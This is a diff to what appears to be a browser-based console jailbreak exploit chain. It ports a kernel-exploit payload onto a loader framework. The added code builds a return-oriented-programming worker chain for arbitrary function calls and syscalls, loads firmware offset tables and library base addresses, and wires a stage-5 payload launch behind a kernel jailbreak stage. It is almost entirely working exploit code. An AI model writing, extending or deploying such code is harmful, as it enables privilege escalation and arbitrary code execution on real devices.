@@ -2,7 +2,7 @@
 // https://github.com/jordyidk/slopkit
 // Uses the loader ARW and gated worker chain.
 // Port edits: E1 remove exports; E2 remove fetchInto; E3 delegate stage5Body;
-// E4 inject launchKexp; E5 update the dry-run summary.
+// E4 inject launchKexp; E5 update the dry-run summary; E6 skip stage 5 when unarmed.
 // PORT BOUNDARY and E markers are used by upstream fidelity checks.
 
 const int64 = globalThis.int64;
@@ -9898,6 +9898,10 @@ function buildLadder(X, E) {
     async run() {
       const mode = String(cfg.payload || "");
       if (mode !== "1" && mode !== "dry") return NA("stage 5 runs a payload, opt-in only");
+      // >>> poops port E6: negative control skips payload launch
+      const unarmed = needTrigger("launch the stage 5 payload");
+      if (unarmed) return unarmed;
+      // >>> poops port E6 end
       if (!E.S.jailbroken) return FAIL("stage 5 needs stage 4's jailbreak (getuid()==0); " +
         "jitshm_create and an RWX mmap need it",);
       const r = await E.stage5({ dryRun: mode === "dry" });
@@ -10120,9 +10124,83 @@ const WATCHDOG_MS = 15000;
 const CHAIN_STACK_SIZE = 0x80000;
 const CHAIN_RESERVED = 0x10000;
 
+// Wobkot deliberately exposes only a small general-purpose payload chain. Poops
+// needs the old arbitrary worker chain for its batched calls and racing threads,
+// so construct that backend lazily and keep it private to this payload.
+class poops_worker_rop extends rop {
+  constructor(p, stack_size, reserved_stack) {
+    super(p, stack_size, reserved_stack);
+    this.p.pre_chain(this);
+  }
+  clear() {
+    super.clear();
+    this.p.pre_chain(this);
+  }
+  async call(rip, rdi, rsi, rdx, rcx, r8, r9) {
+    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+    this.write_result(this.return_value);
+    await this.run();
+    return this.p.read8(this.return_value);
+  }
+  async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
+    return this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+  }
+  add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
+    this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+    this.write_result(retstore);
+  }
+  async run() {
+    await this.p.launch_chain(this);
+    this.clear();
+  }
+}
+
+async function preparePoopsRuntime(api) {
+  if (api.chain && api.chain.stack_entry_point) return null;
+  if (!window.__poopsRuntimeReady) {
+    window.__poopsRuntimeReady = (async () => {
+      if (typeof load_script !== "function")
+        throw new Error("Wobkot's classic-script loader is unavailable");
+      await load_script("src/main.js");
+      if (!window.offsetsLoaded)
+        throw new Error("the Poops firmware table loader did not start");
+      await window.offsetsLoaded;
+      if (typeof globalThis.prepareRop !== "function")
+        throw new Error("the Poops worker runtime did not initialize");
+      return globalThis.prepareRop(api.p, {
+        WorkerRop: poops_worker_rop,
+        libSceNKWebKitBase: api.libSceNKWebKitBase,
+        libSceLibcInternalBase: api.libSceLibcInternalBase,
+        libKernelBase: api.libKernelBase,
+      });
+    })();
+  }
+  return window.__poopsRuntimeReady;
+}
+
+function usePoopsRuntime(api, runtime) {
+  if (!runtime) return api;
+  const out = Object.create(api);
+  for (const [name, value] of Object.entries({
+    p: runtime.p,
+    chain: runtime.chain,
+    __poopsDirectChain: runtime.chain,
+    gadgets: runtime.p.gadgets,
+    syscalls: runtime.p.syscalls,
+    libSceNKWebKitBase: runtime.p.libSceNKWebKitBase,
+    libSceLibcInternalBase: runtime.p.libSceLibcInternalBase,
+    libKernelBase: runtime.p.libKernelBase,
+  })) {
+    Object.defineProperty(out, name, { value, enumerable: true, configurable: true });
+  }
+  return out;
+}
+
+
 // Count ROP slots locally: the gated chain counts recorded operations.
 // Reproduce fcall padding from the exposed stack entry point.
 function makeWorkerChain(api) {
+  if (api.__poopsDirectChain) return api.__poopsDirectChain;
   const gated = api.chain;
   const gadgets = api.gadgets;
   const entryPoint = gated.stack_entry_point;
@@ -10896,7 +10974,15 @@ function disarmKrw(handle) {
     return;
   }
 
-  await api.log("poops on fw " + api.fw, "info");
+  try {
+    api = usePoopsRuntime(api, await preparePoopsRuntime(api));
+  } catch (e) {
+    await api.log("could not start the Poops Wobkot compatibility runtime: " +
+      (e && e.message ? e.message : e), "error");
+    return;
+  }
+
+  await api.log("poops on fw " + api.fw + " (offsets/" + api.fw + ".js)", "info");
 
   const effective = makeConfig(api);
   await quietLog(
